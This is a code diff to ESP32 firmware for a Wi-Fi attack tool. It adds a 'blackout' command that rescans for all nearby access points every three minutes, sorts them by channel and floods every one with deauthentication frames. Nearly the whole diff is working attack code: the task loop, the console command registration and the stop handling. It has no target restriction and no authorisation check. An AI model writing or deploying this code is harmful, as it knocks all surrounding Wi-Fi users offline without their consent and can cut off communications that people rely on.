@@ -145,6 +145,10 @@ static TaskHandle_t sniffer_channel_task_handle = NULL;
 static TaskHandle_t deauth_attack_task_handle = NULL;
 static volatile bool deauth_attack_active = false;
 
+// Blackout attack task
+static TaskHandle_t blackout_attack_task_handle = NULL;
+static volatile bool blackout_attack_active = false;
+
 // Target BSSID monitoring
 #define MAX_TARGET_BSSIDS 10
 static target_bssid_t target_bssids[MAX_TARGET_BSSIDS];
@@ -240,6 +244,7 @@ static int cmd_start_sniffer(int argc, char **argv);
 static int cmd_show_sniffer_results(int argc, char **argv);
 static int cmd_show_probes(int argc, char **argv);
 static int cmd_sniffer_debug(int argc, char **argv);
+static int cmd_start_blackout(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
 static int cmd_reboot(int argc, char **argv);
 static esp_err_t start_background_scan(void);
@@ -252,6 +257,7 @@ static bool check_channel_changes(void);
 static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count);
 // Attack task forward declarations
 static void deauth_attack_task(void *pvParameters);
+static void blackout_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
 // Sniffer functions
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
@@ -1028,6 +1034,110 @@ static void deauth_attack_task(void *pvParameters) {
     vTaskDelete(NULL); // Delete this task
 }
 
+// Blackout attack task function (runs in background)
+static void blackout_attack_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    MY_LOG_INFO(TAG, "Blackout attack task started.");
+    
+    // Main loop: scan every 3 minutes, sort by channel, attack all networks
+    while (blackout_attack_active && !operation_stop_requested) {
+        MY_LOG_INFO(TAG, "Starting blackout cycle: scanning all networks...");
+        
+        // Start background scan
+        esp_err_t scan_result = start_background_scan();
+        if (scan_result != ESP_OK) {
+            MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
+            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait 1 second before retry
+            continue;
+        }
+        
+        // Wait for scan to complete
+        int timeout = 0;
+        while (g_scan_in_progress && timeout < 200 && blackout_attack_active && !operation_stop_requested) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+            timeout++;
+        }
+        
+        if (operation_stop_requested) {
+            MY_LOG_INFO(TAG, "Blackout attack: Stop requested during scan, terminating...");
+            break;
+        }
+        
+        if (g_scan_in_progress) {
+            MY_LOG_INFO(TAG, "Scan timeout, retrying...");
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            continue;
+        }
+        
+        if (!g_scan_done || g_scan_count == 0) {
+            MY_LOG_INFO(TAG, "No scan results available, retrying...");
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            continue;
+        }
+        
+        MY_LOG_INFO(TAG, "Found %d networks, sorting by channel...", g_scan_count);
+        
+        // Sort networks by channel (ascending order)
+        for (int i = 0; i < g_scan_count - 1; i++) {
+            for (int j = 0; j < g_scan_count - i - 1; j++) {
+                if (g_scan_results[j].primary > g_scan_results[j + 1].primary) {
+                    wifi_ap_record_t temp = g_scan_results[j];
+                    g_scan_results[j] = g_scan_results[j + 1];
+                    g_scan_results[j + 1] = temp;
+                }
+            }
+        }
+        
+        // Set all networks as selected for attack
+        g_selected_count = g_scan_count;
+        for (int i = 0; i < g_selected_count; i++) {
+            g_selected_indices[i] = i;
+        }
+        
+        // Save target BSSIDs for deauth attack
+        save_target_bssids();
+        
+        MY_LOG_INFO(TAG, "Starting deauth attack on all %d networks (sorted by channel)...", g_selected_count);
+        
+        // Attack all networks (no periodic rescan needed since we rescan every 3 minutes)
+        int attack_cycles = 0;
+        const int MAX_ATTACK_CYCLES = 180; // 3 minutes at 100ms per cycle = 1800 cycles, but we'll do fewer cycles
+        
+        while (attack_cycles < MAX_ATTACK_CYCLES && blackout_attack_active && !operation_stop_requested) {
+            // Send deauth frames to all networks
+            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
+            
+            attack_cycles++;
+            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between attack cycles
+        }
+        
+        if (operation_stop_requested) {
+            MY_LOG_INFO(TAG, "Blackout attack: Stop requested during attack, terminating...");
+            break;
+        }
+        
+        MY_LOG_INFO(TAG, "Attack cycle completed, waiting 3 minutes before next scan...");
+        
+        // Wait 3 minutes before next scan (180 seconds)
+        for (int wait_cycle = 0; wait_cycle < 1800 && blackout_attack_active && !operation_stop_requested; wait_cycle++) {
+            vTaskDelay(pdMS_TO_TICKS(100)); // 100ms chunks for responsive stop
+        }
+    }
+    
+    // Clean up
+    blackout_attack_active = false;
+    blackout_attack_task_handle = NULL;
+    
+    // Clear target BSSIDs
+    target_bssid_count = 0;
+    memset(target_bssids, 0, sizeof(target_bssids));
+    
+    MY_LOG_INFO(TAG, "Blackout attack task finished.");
+    
+    vTaskDelete(NULL); // Delete this task
+}
+
 static int cmd_start_deauth(int argc, char **argv) {
     onlyDeauth = 1;
     return cmd_start_evil_twin(argc, argv);
@@ -1092,6 +1202,44 @@ static int cmd_start_sae_overflow(int argc, char **argv) {
     } else {
         MY_LOG_INFO(TAG,"SAE Overflow: you need to select exactly ONE network (use select_networks).");
     }
+    return 0;
+}
+
+// Blackout attack command - scans all networks every 3 minutes, sorts by channel, attacks all
+static int cmd_start_blackout(int argc, char **argv) {
+    //avoid compiler warnings:
+    (void)argc; (void)argv;
+    
+    // Check if blackout attack is already running
+    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Blackout attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
+    // Reset stop flag at the beginning of operation
+    operation_stop_requested = false;
+    
+    MY_LOG_INFO(TAG, "Starting blackout attack - scanning all networks every 3 minutes...");
+    MY_LOG_INFO(TAG, "Networks will be sorted by channel for efficient attacking.");
+    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack.");
+    
+    // Start blackout attack in background task
+    blackout_attack_active = true;
+    BaseType_t result = xTaskCreate(
+        blackout_attack_task,
+        "blackout_task",
+        4096,  // Stack size
+        NULL,
+        5,     // Priority
+        &blackout_attack_task_handle
+    );
+    
+    if (result != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create blackout attack task!");
+        blackout_attack_active = false;
+        return 1;
+    }
+    
     return 0;
 }
 
@@ -1225,6 +1373,28 @@ static int cmd_stop(int argc, char **argv) {
             sae_attack_task_handle = NULL;
             MY_LOG_INFO(TAG, "SAE overflow task forcefully stopped.");
         }
+    }
+    
+    // Stop blackout attack task if running
+    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping blackout attack task...");
+        blackout_attack_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && blackout_attack_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (blackout_attack_task_handle != NULL) {
+            vTaskDelete(blackout_attack_task_handle);
+            blackout_attack_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Blackout attack task forcefully stopped.");
+        }
+        
+        // Clear target BSSIDs
+        target_bssid_count = 0;
+        memset(target_bssids, 0, sizeof(target_bssids));
     }
     
     // Stop any active attacks
@@ -1835,6 +2005,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&sae_overflow_cmd));
+
+    const esp_console_cmd_t blackout_cmd = {
+        .command = "start_blackout",
+        .help = "Starts blackout attack - scans all networks every 3 minutes, sorts by channel, attacks all",
+        .hint = NULL,
+        .func = &cmd_start_blackout,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&blackout_cmd));
 
     const esp_console_cmd_t wardrive_cmd = {
         .command = "start_wardrive",
